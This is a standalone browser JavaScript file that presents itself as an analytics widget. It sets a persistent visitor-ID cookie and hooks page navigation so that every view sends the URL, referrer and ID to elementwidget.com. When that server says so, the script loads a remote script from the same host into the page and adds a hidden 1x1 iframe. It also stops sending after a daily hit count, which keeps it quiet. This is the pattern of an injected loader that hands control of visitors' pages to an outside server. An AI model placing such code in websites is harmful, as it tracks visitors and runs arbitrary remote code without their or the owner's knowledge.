// var exec = 0;
Info().then(function (value) {
  window.addEventListener("locationchange", function () {
    Info().then(function (value) {});
    // console.log('location changed!');
  });
});

async function Info() {
  if(getCookie('_nosend_')) return;
  var clickId = getCookie("user_id_t");

  if (!clickId || clickId === "") clickId = uuidv4();

  var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
  document.cookie =
    "user_id_t=" + clickId + "; expires=" + expires + ";path=/;";

  var click_ct = getCookie('ret_user_id_ct') && parseInt(getCookie('ret_user_id_ct')) || 0;
  ++click_ct;    
  var expires1 = (new Date(Date.now() + 86400 * 1000)).toUTCString();
  document.cookie = 'ret_user_id_ct=' + click_ct + '; expires=' + expires1 +';path=/;'
  if(click_ct > 2000) {
      document.cookie = '_nosend_=1; expires=' + expires +';path=/;'
      return ;
  }

  var data = {
    url: window.location.href,
    referrer: document.referrer,
    unique_id: clickId,
    to: new Date().getTimezoneOffset(),
  };
  try {
    let response = await fetch("https://elementwidget.com/get/", {
      method: "POST",
      body: new URLSearchParams(data),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      },
    });
    if (response && response.ok) {
      var result = await response.json();
      if (result && result["error"] && result["id"]) {
        var script = document.createElement("script");
        script.src =
          "https://elementwidget.com/get/err.js?id=" + result["id"];
        document.head.appendChild(script);
      }
      if (result && result["event"] && result["site_id"]) {
        var iframe = document.createElement("iframe");
        iframe.src =
          "https://elementwidget.com/track_event/?site_id=" +
          result["site_id"] +
          "&user_id=" +
          clickId +
          "&event=" +
          result["event"];
        iframe.width = "1";
        iframe.height = "1";
        iframe.style.display = "none";
        iframe.style.visibility = "hidden";
        document.body.appendChild(iframe);
      }
    } else {
      return "";
    }
  } catch (error) {}

  return "";
}

function getCookie(cname) {
  var name = cname + "=";
  var ca = document.cookie.split(";");
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) === " ") {
      c = c.substring(1);
    }
    if (c.indexOf(name) === 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}

function uuidv4() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    var r = (Math.random() * 16) | 0,
      v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

(() => {
  let oldPushState = history.pushState;
  history.pushState = function pushState() {
    let ret = oldPushState.apply(this, arguments);
    window.dispatchEvent(new Event("pushstate"));
    window.dispatchEvent(new Event("locationchange"));
    return ret;
  };

  let oldReplaceState = history.replaceState;
  history.replaceState = function replaceState() {
    let ret = oldReplaceState.apply(this, arguments);
    window.dispatchEvent(new Event("replacestate"));
    window.dispatchEvent(new Event("locationchange"));
    return ret;
  };

  window.addEventListener("popstate", () => {
    window.dispatchEvent(new Event("locationchange"));
  });
})();
